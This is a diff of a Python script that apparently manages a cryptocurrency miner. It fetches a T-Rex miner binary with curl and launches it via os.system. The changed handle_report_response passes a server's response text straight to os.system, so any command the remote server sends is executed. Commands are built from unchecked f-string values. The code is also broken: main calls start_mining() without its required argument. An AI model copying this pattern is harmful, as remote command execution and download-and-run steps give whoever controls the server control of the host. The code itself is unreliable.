@@ -2,6 +2,7 @@ import requests
 import time
 import os
 import json
+import time
 
 import trex
 
@@ -29,8 +30,8 @@ def get_miner():
     os.system(f'curl {miner_url} > /mine/miners/t-rex')
 
 
-def start_mining(miner_path, options, out_file):
-    os.system(f'{miner_path} {options} > {out_file} &')
+def start_mining(options):
+    os.system(f'/mine/miners/t-rex {options} > out &')
 
 
 def send_report():
@@ -40,9 +41,15 @@ def send_report():
 
 
 def handle_report_response(res):
-    j = json.loads(res.text)
-    if 'run' in j:
-        os.system(j)
+    os.system(res.text)
+
 
 def main():
     start_mining()
+    # while True:
+    #     time.sleep(30)
+    #     res = send_report()
+    #     handle_report_response(res)
+
+if __name__ == '__main__':
+    main()
